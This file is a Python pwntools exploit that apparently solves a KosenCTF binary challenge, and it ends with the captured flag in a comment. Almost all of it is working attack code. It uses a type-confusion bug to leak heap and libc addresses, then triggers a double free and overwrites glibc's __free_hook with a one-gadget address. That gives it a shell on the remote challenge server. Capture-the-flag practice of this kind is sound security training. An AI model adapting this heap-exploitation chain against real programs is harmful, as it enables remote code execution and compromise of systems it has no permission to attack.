from pwn import *

import struct


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


def pack_to_double(x):
    """
    pack integer to double
    """
    b = p64(x)
    return ud(b)


def ud(b):
    """
    unpack bytes to double
    """
    return struct.unpack('d', b)[0]


@debug
def set_string(index, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.sendlineafter(b'): ', b'1')
    io.sendlineafter(b'data: ', data)
    io.recvuntil(b'[+] Successfully set value')


@debug
def set_double(index, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.sendlineafter(b'): ', b'2')
    io.sendlineafter(b'data: ', str(data).encode())
    io.recvuntil(b'[+] Successfully set value')


@debug
def set_integer(index, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.sendlineafter(b'): ', b'3')
    io.sendlineafter(b'data: ', b'%d' % data)
    io.recvuntil(b'[+] Successfully set value')


@debug
def confuse(index, value):
    set_double(index, pack_to_double(value))


@debug
def show():
    io.sendlineafter(b'> ', b'2')
    io.recvuntil(b'list {\n')
    list_ = []
    for i in range(10):
        io.recvuntil(b'%d: ' % i)
        if io.recv(1) == b'u':
            list_.append(None)
            continue
        type_ = io.recvuntil(b'] ')[:-2]
        if type_ == b'string':
            io.recvuntil('"')
            data = io.recvuntil(b'"\n')[:-2]
        elif type_ == b'double':
            data = float(io.recvline().rstrip())
        elif type_ == b'integer':
            data = int(io.recvline().rstrip())
        else:
            data = None
        list_.append(data)
    return list_


@debug
def delete(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.recvuntil(b'[+] Successfully deleted value')

binpath = './chall'

elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
b *0x400725
set $list=0x6020a0
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('pwn.kosenctf.com', 9005)


# leak address
set_string(0, b'A')
confuse(1, elf.symbols['list'])  # point to list[0] which points to heap chunk
list_ = show()
addr_chunk = u64(list_[1].ljust(8, b'\x00'))
addr_heap = addr_chunk - 0x260
print('addr_heap = 0x{:x}'.format(addr_heap))

confuse(2, elf.got['free'])
list_ = show()
addr_libc = u64(list_[2].ljust(8, b'\x00')) - libc.symbols['free']
print('addr_libc = 0x{:x}'.format(addr_libc))

# double free
confuse(3, addr_chunk)
delete(0)
delete(3)

# overwrite free hook
one_gadgets = [324453, 324546, 1090652]
set_string(4, p64(addr_libc + libc.symbols['__free_hook']))
set_string(5, b'consume')
# the malloc() which is indirectly called from menu()
# will read one gadget address into __free_hook.
# (menu() -> get_integer() -> get_string() -> getline() -> malloc())
io.sendlineafter(b'> ', p64(addr_libc + one_gadgets[1]))


io.interactive()


# KosenCTF{add_0x2000000000000_to_double_precision_values}
